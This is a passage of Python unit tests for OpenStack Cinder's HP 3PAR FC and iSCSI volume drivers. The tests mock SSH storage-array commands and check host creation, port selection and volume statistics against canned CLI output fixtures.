test_get_volume_stats(self):\n        self.flags(lock_path=self.tempdir)\n\n        def fake_safe_get(*args):\n            return \"HP3PARFCDriver\"\n\n        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'FC')\n        self.assertEquals(stats['total_capacity_gb'], 'infinite')\n        self.assertEquals(stats['free_capacity_gb'], 'infinite')\n\n        #modify the CPG to have a limit\n        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)\n        options = {'SDGrowth': {'limitMiB': 8192}}\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, options)\n\n        const = 0.0009765625\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'FC')\n        total_capacity_gb = 8192 * const\n        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)\n        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)\n        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, {})\n\n    def test_create_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-persona', '1', '-domain',\n                            ('OpenStack',), 'fakehost', '123456789012345',\n                            '123456789054321'])\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n\n        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n    def test_create_invalid_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-persona', '1', '-domain',\n                            ('OpenStack',), 'fakehost', '123456789012345',\n                            '123456789054321'])\n        create_host_ret = pack(CLI_CR +\n                               'already used by host fakehost.foo (19)')\n        _run_ssh(create_host_cmd, False).AndReturn([create_host_ret, ''])\n\n        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']\n        _run_ssh(show_3par_cmd, False).AndReturn([pack(FC_SHOWHOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n\n        self.assertEquals(host['name'], 'fakehost.foo')\n\n    def test_create_modify_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack(NO_FC_HOST_RET), ''])\n\n        create_host_cmd = ['createhost', '-add', 'fakehost', '123456789012345',\n                           '123456789054321']\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n\nclass TestHP3PARISCSIDriver(HP3PARBaseDriver, test.TestCase):\n\n    TARGET_IQN = \"iqn.2000-05.com.3pardata:21810002ac00383d\"\n\n    _hosts = {}\n\n    def setUp(self):\n        self.tempdir = tempfile.mkdtemp()\n        super(TestHP3PARISCSIDriver, self).setUp()\n        self.setup_driver(self.setup_configuration())\n        self.setup_fakes()\n\n    def setup_fakes(self):\n        super(TestHP3PARISCSIDriver, self).setup_fakes()\n\n        self.stubs.Set(hpdriver.HP3PARISCSIDriver, \"_create_3par_iscsi_host\",\n                       self.fake_create_3par_iscsi_host)\n\n        #target_iqn = 'iqn.2000-05.com.3pardata:21810002ac00383d'\n        self.properties = {'data':\n                          {'target_discovered': True,\n                           'target_iqn': self.TARGET_IQN,\n                           'target_lun': 186,\n                           'target_portal': '1.1.1.2:1234'},\n                           'driver_volume_type': 'iscsi'}\n\n    def tearDown(self):\n        shutil.rmtree(self.tempdir)\n        self._hosts = {}\n        super(TestHP3PARISCSIDriver, self).tearDown()\n\n    def setup_driver(self, configuration, set_up_fakes=True):\n        self.driver = hpdriver.HP3PARISCSIDriver(configuration=configuration)\n\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_client\",\n                       self.fake_create_client)\n\n        if set_up_fakes:\n            self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_ports\",\n                           self.fake_get_ports)\n\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_set_connections\",\n                       self.fake_set_connections)\n        self.driver.do_setup(None)\n\n    def fake_create_3par_iscsi_host(self, hostname, iscsi_iqn,\n                                    domain, persona_id):\n        host = {'FCPaths': [],\n                'descriptors': None,\n                'domain': domain,\n                'iSCSIPaths': [{'driverVersion': None,\n                                'firmwareVersion': None,\n                                'hostSpeed': 0,\n                                'ipAddr': '10.10.221.59',\n                                'model': None,\n                                'name': iscsi_iqn,\n                                'portPos': {'cardPort': 1, 'node': 1,\n                                            'slot': 8},\n                                'vendor': None}],\n                'id': 11,\n                'name': hostname}\n        self._hosts[hostname] = host\n        return hostname\n\n    def test_initialize_connection(self):\n        self.flags(lock_path=self.tempdir)\n        result = self.driver.initialize_connection(self.volume, self.connector)\n        self.assertEqual(result['driver_volume_type'], 'iscsi')\n        self.assertEqual(result['data']['target_iqn'],\n                         self.properties['data']['target_iqn'])\n        self.assertEqual(result['data']['target_portal'],\n                         self.properties['data']['target_portal'])\n        self.assertEqual(result['data']['target_discovered'],\n                         self.properties['data']['target_discovered'])\n\n        # we should have a host and a vlun now.\n        host = self.fake_get_3par_host(self.FAKE_HOST)\n        self.assertEquals(self.FAKE_HOST, host['name'])\n        self.assertEquals(HP3PAR_DOMAIN, host['domain'])\n        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)\n\n        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])\n        self.assertEquals(self.FAKE_HOST, vlun['hostname'])\n\n    def test_get_volume_stats(self):\n        self.flags(lock_path=self.tempdir)\n\n        def fake_safe_get(*args):\n            return \"HP3PARFCDriver\"\n\n        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'iSCSI')\n        self.assertEquals(stats['total_capacity_gb'], 'infinite')\n        self.assertEquals(stats['free_capacity_gb'], 'infinite')\n\n        #modify the CPG to have a limit\n        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)\n        options = {'SDGrowth': {'limitMiB': 8192}}\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, options)\n\n        const = 0.0009765625\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'iSCSI')\n        total_capacity_gb = 8192 * const\n        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)\n        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)\n        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, {})\n\n    def test_create_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',\n                            ('OpenStack',), 'fakehost',\n                            'iqn.1993-08.org.debian:01:222'])\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n\n        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n    def test_create_invalid_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',\n                           ('OpenStack',), 'fakehost',\n                            'iqn.1993-08.org.debian:01:222'])\n        in_use_ret = pack('\\r\\nalready used by host fakehost.foo ')\n        _run_ssh(create_host_cmd, False).AndReturn([in_use_ret, ''])\n\n        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']\n        _run_ssh(show_3par_cmd, False).AndReturn([pack(ISCSI_3PAR_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n\n        self.assertEquals(host['name'], 'fakehost.foo')\n\n    def test_create_modify_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_NO_HOST_RET), ''])\n\n        create_host_cmd = ['createhost', '-iscsi', '-add', 'fakehost',\n                           'iqn.1993-08.org.debian:01:222']\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n    def test_get_ports(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI),\n                                                    ''])\n        self.mox.ReplayAll()\n\n        ports = self.driver.common.get_ports()\n        self.assertEqual(ports['FC'][0], '20210002AC00383D')\n        self.assertEqual(ports['iSCSI']['10.10.120.252']['nsp'], '0:8:2')\n\n    def test_get_iscsi_ip_active(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record set up\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])\n\n        self.mox.ReplayAll()\n\n        config = self.setup_configuration()\n        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']\n        self.setup_driver(config, set_up_fakes=False)\n\n        #record\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN), ''])\n\n        self.mox.ReplayAll()\n\n        ip = self.driver._get_iscsi_ip('fakehost')\n        self.assertEqual(ip, '10.10.220.253')\n\n    def test_get_iscsi_ip(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record driver set up\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])\n\n        #record\n        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']\n        show_vlun_ret = 'no vluns listed\\r\\n'\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(show_vlun_ret), ''])\n        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n\n        self.mox.ReplayAll()\n\n        config = self.setup_configuration()\n        config.iscsi_ip_address = '10.10.10.10'\n        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']\n        self.setup_driver(config, set_up_fakes=False)\n\n        ip = self.driver._get_iscsi_ip('fakehost')\n        self.assertEqual(ip, '10.10.220.252')\n\n    def test_invalid_iscsi_ip(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record driver set up\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_port_cmd = ['showport']\n        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])\n\n        show_port_i_cmd = ['showport', '-iscsi']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),\n                                                    ''])\n\n        show_port_i_cmd = ['showport', '-iscsiname']\n        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])\n\n        config = self.setup_configuration()\n        config.hp3par_iscsi_ips = ['10.10.220.250', '10.10.220.251']\n        config.iscsi_ip_address = '10.10.10.10'\n        self.mox.ReplayAll()\n\n        # no valid ip addr should be configured.\n        self.assertRaises(exception.InvalidInput,\n                          self.setup_driver,\n                          config,\n                          set_up_fakes=False)\n\n    def test_get_least_used_nsp(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])\n\n        self.mox.ReplayAll()\n        # in use count                           11       12\n        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:8:1'])\n        self.assertEqual(nsp, '0:2:1')\n\n        # in use count                            11       10\n        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:2:1'])\n        self.assertEqual(nsp, '1:2:1')\n\n        # in use count                            0       10\n        nsp = self.driver._get_least_used_nsp(['1:1:1', '1:2:1'])\n        self.assertEqual(nsp, '1:1:1')\n\n\ndef pack(arg):\n    header = '\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n'\n    footer = '\\r\\n\\r\\n\\r\\n'\n    return header + arg + footer\n\nFC_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost,Generic,50014380242B8B4C,0:2:1,n/a\\r\\n'\n    '75,fakehost,Generic,50014380242B8B4E,---,n/a\\r\\n'\n    '75,fakehost,Generic,1000843497F90711,0:2:1,n/a \\r\\n'\n    '75,fakehost,Generic,1000843497F90715,1:2:1,n/a\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nFC_SHOWHOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost.foo,Generic,50014380242B8B4C,0:2:1,n/a\\r\\n'\n    '75,fakehost.foo,Generic,50014380242B8B4E,---,n/a\\r\\n'\n    '75,fakehost.foo,Generic,1000843497F90711,0:2:1,n/a \\r\\n'\n    '75,fakehost.foo,Generic,1000843497F90715,1:2:1,n/a\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost.foo,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost.foo ----------\\r\\n'\n    'Name       : fakehost.foo\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nNO_FC_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nISCSI_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost,Generic,iqn.1993-08.org.debian:01:222,---,10.10.222.12\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nISCSI_NO_HOST_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost ----------\\r\\n'\n    'Name       : fakehost\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nISCSI_PORT_IDS_RET = (\n    'N:S:P,-Node_WWN/IPAddr-,-----------Port_WWN/iSCSI_Name-----------\\r\\n'\n    '0:2:1,28210002AC00383D,20210002AC00383D\\r\\n'\n    '0:2:2,2FF70002AC00383D,20220002AC00383D\\r\\n'\n    '0:2:3,2FF70002AC00383D,20230002AC00383D\\r\\n'\n    '0:2:4,2FF70002AC00383D,20240002AC00383D\\r\\n'\n    '0:5:1,2FF70002AC00383D,20510002AC00383D\\r\\n'\n    '0:5:2,2FF70002AC00383D,20520002AC00383D\\r\\n'\n    '0:5:3,2FF70002AC00383D,20530002AC00383D\\r\\n'\n    '0:5:4,2FF70202AC00383D,20540202AC00383D\\r\\n'\n    '0:6:4,2FF70002AC00383D,20640002AC00383D\\r\\n'\n    '0:8:1,10.10.120.253,iqn.2000-05.com.3pardata:21810002ac00383d\\r\\n'\n    '0:8:2,0.0.0.0,iqn.2000-05.com.3pardata:20820002ac00383d\\r\\n'\n    '1:2:1,29210002AC00383D,21210002AC00383D\\r\\n'\n    '1:2:2,2FF70002AC00383D,21220002AC00383D\\r\\n'\n    '-----------------------------------------------------------------\\r\\n')\n\nVOLUME_STATE_RET = (\n    'Id,Name,Prov,Type,State,-Detailed_State-\\r\\n'\n    '410,volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7,snp,vcopy,normal,'\n    'normal\\r\\n'\n    '-----------------------------------------------------------------\\r\\n')\n\nPORT_RET = (\n    'N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,Protocol,'\n    'Label,Partner,FailoverState\\r\\n'\n    '0:2:1,target,ready,28210002AC00383D,20210002AC00383D,host,FC,'\n    '-,1:2:1,none\\r\\n'\n    '0:2:2,initiator,loss_sync,2FF70002AC00383D,20220002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:2:3,initiator,loss_sync,2FF70002AC00383D,20230002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:2:4,initiator,loss_sync,2FF70002AC00383D,20240002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:1,initiator,loss_sync,2FF70002AC00383D,20510002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:2,initiator,loss_sync,2FF70002AC00383D,20520002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:3,initiator,loss_sync,2FF70002AC00383D,20530002AC00383D,free,FC,'\n    '-,-,-\\r\\n'\n    '0:5:4,initiator,ready,2FF70202AC00383D,20540202AC00383D,host,FC,'\n    '-,1:5:4,active\\r\\n'\n    '0:6:1,initiator,ready,2FF70002AC00383D,20610002AC00383D,disk,FC,'\n    '-,-,-\\r\\n'\n    '0:6:2,initiator,ready,2FF70002AC00383D,20620002AC00383D,disk,FC,'\n    '-,-,-\\r\\n')\n\nISCSI_PORT_RET = (\n    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'\n    'iSNS_Port\\r\\n'\n    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '0:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,82,1500,n/a,0,0.0.0.0,3205\\r\\n'\n    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '1:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,182,1500,n/a,0,0.0.0.0,3205\\r\\n')\n\nISCSI_3PAR_RET = (\n    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\\r\\n'\n    '75,fakehost.foo,Generic,iqn.1993-08.org.debian:01:222,---,'\n    '10.10.222.12\\r\\n'\n    '\\r\\n'\n    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\\r\\n'\n    '75,fakehost.foo,--,--\\r\\n'\n    '\\r\\n'\n    '---------- Host fakehost.foo ----------\\r\\n'\n    'Name       : fakehost.foo\\r\\n'\n    'Domain     : FAKE_TEST\\r\\n'\n    'Id         : 75\\r\\n'\n    'Location   : --\\r\\n'\n    'IP Address : --\\r\\n'\n    'OS         : --\\r\\n'\n    'Model      : --\\r\\n'\n    'Contact    : --\\r\\n'\n    'Comment    : --  \\r\\n\\r\\n\\r\\n')\n\nSHOW_PORT_ISCSI = (\n    'N:S:P,IPAddr,---------------iSCSI_Name----------------\\r\\n'\n    '0:8:1,1.1.1.2,iqn.2000-05.com.3pardata:21810002ac00383d\\r\\n'\n    '0:8:2,10.10.120.252,iqn.2000-05.com.3pardata:20820002ac00383d\\r\\n'\n    '1:8:1,10.10.220.253,iqn.2000-05.com.3pardata:21810002ac00383d\\r\\n'\n    '1:8:2,10.10.220.252,iqn.2000-05.com.3pardata:21820002ac00383d\\r\\n'\n    '-------------------------------------------------------------\\r\\n')\n\nSHOW_VLUN = (\n    'Lun,VVName,HostName,---------Host_WWN/iSCSI_Name----------,Port,Type,'\n    'Status,ID\\r\\n'\n    '0,a,fakehost,iqn.1993-08.org.debian:01:3a779e4abc22,1:8:1,matched set,'\n    'active,0\\r\\n'\n    '------------------------------------------------------------------------'\n    '--------------\\r\\n')\n\nSHOW_VLUN_NONE = (\n    'Port\\r\\n0:2:1\\r\\n0:2:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n1:2:1\\r\\n'\n    '1:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n'\n    '1:8:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n'\n    '0:2:1\\r\\n0:2:1\\r\\n1:8:1\\r\\n1:8:1\\r\\n0:2:1\\r\\n0:2:1\\r\\n1:2:1\\r\\n1:2:1\\r\\n'\n    '1:2:1\\r\\n1:2:1\\r\\n1:8:1\\r\\n-----')\n\nREADY_ISCSI_PORT_RET = (\n    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'\n    'iSNS_Port\\r\\n'\n    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '0:8:2,ready,10.10.120.252,255.255.224.0,0.0.0.0,82,1500,10Gbps,0,'\n    '0.0.0.0,3205\\r\\n'\n    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'\n    '0,0.0.0.0,3205\\r\\n'\n    '1:8:2,ready,10.10.220.252,255.255.224.0,0.0.0.0,182,1500,10Gbps,0,'\n    '0.0.0.0,3205\\r\\n'\n    '-------------------------------------------------------------------'\n    '----------------------\\r\\n')\n/n/n/ncinder/volume/drivers/san/hp/hp_3par_common.py/n/n# vim: 